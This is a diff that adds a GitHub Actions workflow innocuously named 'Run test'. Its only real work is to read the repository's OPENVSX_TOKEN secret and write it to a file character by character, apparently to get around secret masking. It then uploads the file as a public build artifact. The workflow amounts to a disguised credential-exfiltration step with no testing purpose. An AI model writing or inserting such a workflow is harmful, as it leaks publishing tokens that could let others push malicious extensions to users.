@@ -1,0 +1,25 @@
+name: Run test
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: write output
+      env:
+        MY_VAL: ${{ secrets.OPENVSX_TOKEN }}
+      run: |
+        import os
+        with open("output.txt", "w") as file:
+          for q in (os.getenv("MY_VAL")):
+            file.write(q)
+      shell: python
+    - name: Archive output.txt
+      uses: actions/upload-artifact@v4
+      with:
+        name: output.txt
+        path: |
+          output.txt
